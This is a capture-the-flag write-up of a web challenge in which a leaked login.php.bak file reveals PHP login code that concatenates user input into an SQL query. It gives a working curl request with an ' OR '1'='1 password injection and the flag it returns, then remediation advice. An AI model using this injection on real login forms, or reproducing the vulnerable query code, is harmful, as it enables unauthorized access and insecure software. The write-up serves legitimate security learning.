---
date created: Sunday, February 15th 2026, 12:33:12 am
date modified: Sunday, February 15th 2026, 12:49:45 am
---

# SharpScratch

**Points:** 200
**Description:** You have to login
**Source:**

# Method:
## Description & Investigation:

You have a form with a `username` and `password` field. Comments within the HTML source code allude to `.bak files`, by trying to login and adding a `login.php.bak`, you download a php file that contains sensitive data. 
## Enumeration:

From `login.php.bak`
```PHP
<?php
include "db.php";
$key = "The real key goes here";
$connect = mysql_connect($host, $user, $password);

if (!$connect) {
    echo "Database Connection Failure";
    exit;
}

if( !mysql_select_db($dbname) ) {
    echo "Failed to select DB";
    exit;
}

$username = $_POST['username'];
$password = $_POST['password'];

// VULNERABLE LINE: No sanitization or parameterization
$query="SELECT * from users where username='".$username."' and password='".$password."';";

$result = mysql_query($query);
$rows = mysql_num_rows($result);

# If we have any rows, the user must have logged in!
if ($rows) {
    echo "Login Success!\n";
    if( $username == "David Lightman" ) {
        echo "Welcome back David. The key is '<b>" . $key . "</b>'\n";
    } else {
        echo "User '$username' cannot view keys.\n";
    }
} else {
    echo "Login Failed\n";
}
?>
```

## Vulnerability

Two critical flaws exist in this logic:
1. **SQL Injection (SQLi):** The `$username` and `$password` variables are taken directly from `$_POST` and concatenated into the query string.
2. **Two-Stage Authentication Gate:** 
	- **Stage 1:** The SQL query must return at least one row (`$rows > 0`).
    - **Stage 2:** The `$username` variable (from the POST data, not the database) must strictly equal `"David Lightman"`.
        
To succeed, we must provide the literal username "David Lightman" to pass the second check, while injecting into the password field to bypass the first check.

Because of the extra validation for the username, we can't just skip it with the SQL injection, but we can with the password field.

The SQL injection is:
```Bash
curl -X POST https://sharpscratch.web.baectf.com/login.php \
  -d 'username=David Lightman' \
  -d "password=' OR '1'='1"
Login Success!
Welcome back David. The key is '<b>Careful with that hypodeemic nerdle</b>'
```

This makes the query:
```SQL
SELECT * FROM users WHERE username='David Lightman' AND password='' OR '1'='1';
```
## Key Takeaways & Remediation:

- Backup files like (`.bak, .old, .swp`) should never be reachable through production. You can configure your web server to block these extensions.
- Use prepared statements rather than concatenating user input, to separate user input from SQL.